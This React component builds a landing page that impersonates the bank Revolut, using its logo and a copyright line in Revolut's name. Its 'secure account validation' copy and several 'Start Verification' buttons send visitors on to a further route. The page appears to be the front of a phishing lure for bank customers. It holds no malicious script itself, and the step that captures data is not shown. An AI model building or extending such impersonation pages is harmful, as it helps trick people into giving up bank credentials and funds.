import React from 'react';
import { ArrowRight, Shield, Zap, Globe, Lock, CheckCircle, CreditCard } from 'lucide-react';
import { useNavigate } from "react-router-dom";
import './revolutHome.css';
import revolutLogo from "../../assets/revolut_logo.png";

const RevolutLanding = () => {
  const navigate = useNavigate();

  return (
    <div className="revolut-container">
      {/* Navigation */}
      <nav className="revolut-navbar">
        <div className="revolut-nav-content">
          <img 
            src={revolutLogo} 
            alt="Revolut Logo" 
            className="revolut-logo-img" 
          />
        </div>
      </nav>

      {/* Hero Section */}
      <section className="revolut-hero">
        <div className="revolut-hero-glow"></div>
        
        <div className="revolut-hero-content">
          <div className="revolut-hero-badge">
            <div className="revolut-badge-pulse"></div>
            <span>Secure Account Validation</span>
          </div>
          
          <h1 className="revolut-hero-title">
            Protect and verify<br />
            <span className="revolut-gradient-text">your financial account</span>
          </h1>
          
          <p className="revolut-hero-subtitle">
            Complete a secure verification process to confirm account ownership, prevent unauthorized access, and keep your funds protected.
          </p>
          
          <button
            className="revolut-btn revolut-btn-primary"
            onClick={() => navigate("/revolut-landing")}
          >
            Start Verification
            <ArrowRight className="revolut-btn-icon" />
          </button>

          {/* Floating Feature Cards */}
          <div className="revolut-floating-cards">
            <div className="revolut-feature-card revolut-card-1">
              <CreditCard className="revolut-card-icon" />
              <div>
                <div className="revolut-card-title">Account Matching</div>
                <div className="revolut-card-desc">Secure identity checks</div>
              </div>
            </div>
            
            <div className="revolut-feature-card revolut-card-2">
              <Shield className="revolut-card-icon" />
              <div>
                <div className="revolut-card-title">Protected Access</div>
                <div className="revolut-card-desc">Advanced security layers</div>
              </div>
            </div>
            
            <div className="revolut-feature-card revolut-card-3">
              <Zap className="revolut-card-icon" />
              <div>
                <div className="revolut-card-title">Fast Validation</div>
                <div className="revolut-card-desc">Quick verification flow</div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Features Section */}
      <section className="revolut-features-section">
        <div className="revolut-section-header">
          <h2 className="revolut-section-title">Built for secure account protection</h2>
          <p className="revolut-section-description">
            Designed to verify ownership and safeguard your financial access
          </p>
        </div>

        <div className="revolut-features-grid">
          <div className="revolut-feature-box">
            <div className="revolut-feature-icon-wrapper">
              <Globe className="revolut-feature-icon" />
            </div>
            <h3 className="revolut-feature-title">Account Confirmation</h3>
            <p className="revolut-feature-text">
              Verify your account details securely to ensure they belong to you and prevent unauthorized activity.
            </p>
          </div>

          <div className="revolut-feature-box">
            <div className="revolut-feature-icon-wrapper">
              <Shield className="revolut-feature-icon" />
            </div>
            <h3 className="revolut-feature-title">Enhanced Security</h3>
            <p className="revolut-feature-text">
              Multiple security checks help protect your data and block suspicious access attempts.
            </p>
          </div>

          <div className="revolut-feature-box">
            <div className="revolut-feature-icon-wrapper">
              <Zap className="revolut-feature-icon" />
            </div>
            <h3 className="revolut-feature-title">Efficient Verification</h3>
            <p className="revolut-feature-text">
              A streamlined process that validates your account without unnecessary delays.
            </p>
          </div>

          <div className="revolut-feature-box">
            <div className="revolut-feature-icon-wrapper">
              <Lock className="revolut-feature-icon" />
            </div>
            <h3 className="revolut-feature-title">Privacy & Control</h3>
            <p className="revolut-feature-text">
              Your information is handled securely and used only for verification purposes.
            </p>
          </div>
        </div>
      </section>

      {/* Trust Section */}
      <section className="revolut-trust-section">
        <div className="revolut-trust-content">
          <div className="revolut-trust-visual">
            <div className="revolut-trust-badge">
              <Shield className="revolut-trust-icon" />
            </div>
          </div>
          
          <div className="revolut-trust-text">
            <h2 className="revolut-trust-title">A secure process trusted worldwide</h2>
            <p className="revolut-trust-description">
              Our verification systems are designed to protect accounts, confirm ownership, and maintain the highest security standards.
            </p>
            
            <div className="revolut-trust-features">
              <div className="revolut-trust-item">
                <CheckCircle className="revolut-check-icon" />
                <span>Secure account ownership validation</span>
              </div>
              <div className="revolut-trust-item">
                <CheckCircle className="revolut-check-icon" />
                <span>Encrypted data handling</span>
              </div>
              <div className="revolut-trust-item">
                <CheckCircle className="revolut-check-icon" />
                <span>Continuous security monitoring</span>
              </div>
              <div className="revolut-trust-item">
                <CheckCircle className="revolut-check-icon" />
                <span>Protection against unauthorized access</span>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* CTA Section */}
      <section className="revolut-cta-section">
        <div className="revolut-cta-content">
          <h2 className="revolut-cta-title">Secure your account now</h2>
          <p className="revolut-cta-text">
            Complete verification to confirm ownership and keep your account protected.
          </p>
          <button
            className="revolut-btn revolut-btn-cta"
            onClick={() => navigate("/revolut-landing")}
          >
            Begin Verification
            <ArrowRight className="revolut-btn-icon" />
          </button>
        </div>
      </section>

      {/* Footer */}
      <footer className="revolut-footer">
        <div className="revolut-footer-content">
          <div className="revolut-footer-section revolut-footer-main">
            <img 
              src={revolutLogo} 
              alt="Revolut Logo" 
              className="revolut-footer-logo" 
            />
            <p className="revolut-footer-description">
              Secure account validation designed to protect access and verify ownership.
            </p>
          </div>
{/* 
          <div className="revolut-footer-section">
            <h4 className="revolut-footer-heading">Verification</h4>
            <a href="#features" className="revolut-footer-link">Process</a>
            <a href="#security" className="revolut-footer-link">Security</a>
            <a href="#privacy" className="revolut-footer-link">Privacy</a>
          </div>

          <div className="revolut-footer-section">
            <h4 className="revolut-footer-heading">Support</h4>
            <a href="#help" className="revolut-footer-link">Help Center</a>
            <a href="#contact" className="revolut-footer-link">Contact</a>
            <a href="#status" className="revolut-footer-link">System Status</a>
          </div>

          <div className="revolut-footer-section">
            <h4 className="revolut-footer-heading">Legal</h4>
            <a href="#terms" className="revolut-footer-link">Terms</a>
            <a href="#privacy" className="revolut-footer-link">Privacy</a>
          </div> */}
        </div>

        <div className="revolut-footer-bottom">
          <p>© 2025 Revolut Ltd. All rights reserved.</p>
          <p>Account verification and security processes are handled with strict compliance standards.</p>
        </div>
      </footer>
    </div>
  );
};

export default RevolutLanding;
